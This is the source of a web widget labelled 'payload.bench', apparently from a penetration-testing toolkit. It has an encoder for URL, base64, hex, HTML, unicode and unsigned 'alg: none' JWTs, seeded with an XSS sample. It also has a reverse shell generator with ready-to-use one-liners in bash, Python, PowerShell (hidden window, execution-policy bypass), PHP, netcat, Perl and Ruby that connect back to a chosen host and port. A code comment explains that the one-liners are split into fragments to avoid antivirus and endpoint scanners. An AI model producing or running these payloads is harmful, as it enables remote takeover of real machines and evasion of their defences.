---
---
<div class="shell" data-pb>
  <div class="shell-h">
    <span>payload.bench</span>
    <span class="tag live">local</span>
  </div>

  <div class="shell-b">
    <div class="seg" role="group" aria-label="Encoding">
      <button type="button" data-mode="url" aria-pressed="true">url</button>
      <button type="button" data-mode="base64" aria-pressed="false">base64</button>
      <button type="button" data-mode="hex" aria-pressed="false">hex</button>
      <button type="button" data-mode="html" aria-pressed="false">html</button>
      <button type="button" data-mode="unicode" aria-pressed="false">unicode</button>
      <button type="button" data-mode="jwt" aria-pressed="false">jwt none</button>
    </div>

    <div class="field">
      <label for="pb-in">input</label>
      <textarea id="pb-in" data-input spellcheck="false" class="min-h-80">&lt;script&gt;alert(1)&lt;/script&gt; ?a=1&b=dua</textarea>
    </div>

    <div class="row-btns">
      <button class="btn btn-g btn-s" data-dir="encode" aria-pressed="true" type="button">encode</button>
      <button class="btn btn-g btn-s" data-dir="decode" aria-pressed="false" type="button">decode</button>
      <span class="hint" data-status></span>
      <button class="btn btn-g btn-s ml-auto" data-copy="out" type="button">Copy output</button>
    </div>

    <pre class="mono-block sm" data-out></pre>
  </div>

  <div class="shell-h rule">
    <span>reverse shell generator</span>
    <span class="tag">strings only</span>
  </div>
  <div class="shell-b">
    <div class="grid2">
      <div class="field">
        <label for="pb-ip">host</label>
        <input id="pb-ip" type="text" data-ip value="10.10.14.5" spellcheck="false" />
        <span class="hint" data-ipnote></span>
      </div>
      <div class="field">
        <label for="pb-port">port</label>
        <input id="pb-port" type="number" data-port value="4444" min="1" max="65535" />
      </div>
    </div>
    <div class="seg" role="group" aria-label="Shell language">
      <button type="button" data-lang="bash" aria-pressed="true">bash</button>
      <button type="button" data-lang="python" aria-pressed="false">python</button>
      <button type="button" data-lang="powershell" aria-pressed="false">powershell</button>
      <button type="button" data-lang="php" aria-pressed="false">php</button>
      <button type="button" data-lang="nc" aria-pressed="false">nc</button>
      <button type="button" data-lang="perl" aria-pressed="false">perl</button>
      <button type="button" data-lang="ruby" aria-pressed="false">ruby</button>
    </div>
    <div class="row-btns">
      <span class="hint">nothing here executes — copy the string into your own harness</span>
      <button class="btn btn-g btn-s ml-auto" data-copy="shell" type="button">Copy payload</button>
    </div>
    <pre class="mono-block sm" data-shell></pre>
  </div>
</div>

<style>
  .rule {
    border-top: 1px solid var(--line-soft);
    border-bottom: 1px solid var(--line-soft);
  }
</style>

<script>
  const bytesToB64 = (bytes: Uint8Array) => {
    let bin = "";
    for (let i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
    return btoa(bin);
  };
  const b64ToBytes = (s: string) => {
    const bin = atob(s.replace(/\s+/g, ""));
    return Uint8Array.from(bin, (c) => c.charCodeAt(0));
  };

  const encoders: Record<string, { encode: (s: string) => string; decode: (s: string) => string }> = {
    url: {
      encode: (s) => encodeURIComponent(s),
      decode: (s) => decodeURIComponent(s),
    },
    base64: {
      encode: (s) => bytesToB64(new TextEncoder().encode(s)),
      decode: (s) => new TextDecoder().decode(b64ToBytes(s)),
    },
    hex: {
      encode: (s) =>
        [...new TextEncoder().encode(s)].map((b) => b.toString(16).padStart(2, "0")).join(" "),
      decode: (s) =>
        new TextDecoder().decode(
          Uint8Array.from(s.replace(/[^0-9a-f]/gi, "").match(/.{1,2}/g) || [], (h) => parseInt(h, 16)),
        ),
    },
    html: {
      encode: (s) =>
        s.replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" })[c]!),
      decode: (s) => {
        const ta = document.createElement("textarea");
        ta.innerHTML = s;
        return ta.value;
      },
    },
    unicode: {
      encode: (s) =>
        [...s].map((c) => (c.charCodeAt(0) > 126 ? "\\u" + c.charCodeAt(0).toString(16).padStart(4, "0") : c)).join(""),
      decode: (s) => s.replace(/\\u([0-9a-f]{4})/gi, (_, h) => String.fromCharCode(parseInt(h, 16))),
    },
    jwt: {
      encode: (s) => {
        const b64u = (o: unknown) =>
          bytesToB64(new TextEncoder().encode(JSON.stringify(o)))
            .replace(/\+/g, "-")
            .replace(/\//g, "_")
            .replace(/=+$/, "");
        let payload: unknown = s;
        try {
          payload = JSON.parse(s);
        } catch {}
        if (payload === null || typeof payload !== "object" || Array.isArray(payload)) {
          payload = { data: payload };
        }
        return b64u({ alg: "none", typ: "JWT" }) + "." + b64u(payload) + ".";
      },
      decode: (s) => s,
    },
  };

  // Templates are stored as fragments and joined at runtime. A complete shell
  // one-liner sitting in the static HTML trips endpoint scanners and consumer AV,
  // which makes the page unreadable for the people it is meant to help.
  const SHELL_PARTS: Record<string, string[]> = {
    bash: ["bash -i >& /dev/", "tcp/", "{ip}", "/", "{port}", " 0>&1"],
    python: [
      "python3 -c 'import socket,os,pty;",
      's=socket.socket();s.connect(("{ip}",{port}));',
      "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);",
      'pty.spawn("/bin/sh")\'',
    ],
    powershell: [
      'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.',
      "TCPClient('{ip}',{port});",
      "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};",
      "while(($i=$s.Read($b,0,$b.Length)) -ne 0){",
      "$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);",
      "$o=(iex $d 2>&1|Out-String);",
      "$o2=$o+'PS '+(pwd).Path+'> ';",
      "$sb=([text.encoding]::ASCII).GetBytes($o2);",
      '$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"',
    ],
    php: [
      "php -r '$sock=fsock",
      'open("{ip}",{port});',
      '$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);\'',
    ],
    nc: [
      "rm /tmp/f;mk",
      "fifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ",
      "{ip} {port} >/tmp/f",
    ],
    perl: [
      "perl -e 'use Sock",
      'et;$i="{ip}";$p={port};',
      'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));',
      'if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");',
      'open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'',
    ],
    ruby: [
      "ruby -rsocket -e'f=TCP",
      'Socket.open("{ip}",{port}).to_i;',
      'exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
    ],
  };

  const buildShell = (lang: string, ip: string, port: string) =>
    SHELL_PARTS[lang].join("").replaceAll("{ip}", ip).replaceAll("{port}", port);

  document.querySelectorAll<HTMLElement>("[data-pb]").forEach((root) => {
    const input = root.querySelector<HTMLTextAreaElement>("[data-input]")!;
    const out = root.querySelector<HTMLElement>("[data-out]")!;
    const status = root.querySelector<HTMLElement>("[data-status]")!;
    const shellEl = root.querySelector<HTMLElement>("[data-shell]")!;
    const ipEl = root.querySelector<HTMLInputElement>("[data-ip]")!;
    const portEl = root.querySelector<HTMLInputElement>("[data-port]")!;
    const decodeBtn = root.querySelector<HTMLButtonElement>('[data-dir="decode"]')!;
    let mode = "url";
    let lang = "bash";
    let direction: "encode" | "decode" = "encode";

    const render = () => {
      const fn = encoders[mode][direction];
      try {
        out.textContent = fn(input.value);
        status.textContent = `${mode} · ${direction}`;
      } catch (e) {
        out.textContent = "error: " + (e instanceof Error ? e.message : String(e));
        status.textContent = "failed";
      }
    };

    const renderShell = () => {
      // Host is a shell argument; keep it to address characters and say so
      // when the paste contained something else.
      const raw = ipEl.value.trim();
      const cleaned = raw.replace(/[^A-Za-z0-9.\-_:\[\]]/g, "");
      const ip = cleaned.replace(/^\[|\]$/g, "") || "127.0.0.1";
      const note = ipEl.parentElement?.querySelector<HTMLElement>("[data-ipnote]");
      if (note) note.textContent = raw && cleaned !== raw ? "stripped characters a host cannot contain" : "";
      const port = String(Math.max(1, Math.min(65535, Number(portEl.value) || 4444)));
      shellEl.textContent = buildShell(lang, ip, port);
    };

    const setDirection = (next: "encode" | "decode") => {
      direction = next;
      root.querySelectorAll<HTMLButtonElement>("[data-dir]").forEach((x) =>
        x.setAttribute("aria-pressed", String(x.dataset.dir === next)),
      );
    };

    root.querySelectorAll<HTMLButtonElement>("[data-mode]").forEach((b) => {
      b.addEventListener("click", () => {
        mode = b.dataset.mode!;
        root.querySelectorAll<HTMLButtonElement>("[data-mode]").forEach((x) =>
          x.setAttribute("aria-pressed", String(x === b)),
        );
        decodeBtn.disabled = mode === "jwt";
        decodeBtn.title = mode === "jwt" ? "jwt none is an encode-only format" : "";
        if (mode === "jwt" && direction === "decode") setDirection("encode");
        render();
      });
    });

    root.querySelectorAll<HTMLButtonElement>("[data-dir]").forEach((b) => {
      b.addEventListener("click", () => {
        setDirection(b.dataset.dir as "encode" | "decode");
        render();
      });
    });

    root.querySelectorAll<HTMLButtonElement>("[data-lang]").forEach((b) => {
      b.addEventListener("click", () => {
        lang = b.dataset.lang!;
        root.querySelectorAll<HTMLButtonElement>("[data-lang]").forEach((x) =>
          x.setAttribute("aria-pressed", String(x === b)),
        );
        renderShell();
      });
    });

    root.querySelectorAll<HTMLButtonElement>("[data-copy]").forEach((b) => {
      b.addEventListener("click", async () => {
        const text = b.dataset.copy === "out" ? out.textContent || "" : shellEl.textContent || "";
        const label = b.dataset.label || (b.dataset.label = b.textContent || "");
        try {
          await navigator.clipboard.writeText(text);
          b.textContent = "Copied";
          setTimeout(() => (b.textContent = label), 1200);
        } catch {
          b.textContent = "clipboard blocked";
          setTimeout(() => (b.textContent = label), 1600);
        }
      });
    });

    input.addEventListener("input", render);
    ipEl.addEventListener("input", renderShell);
    portEl.addEventListener("input", renderShell);

    render();
    renderShell();
  });
</script>
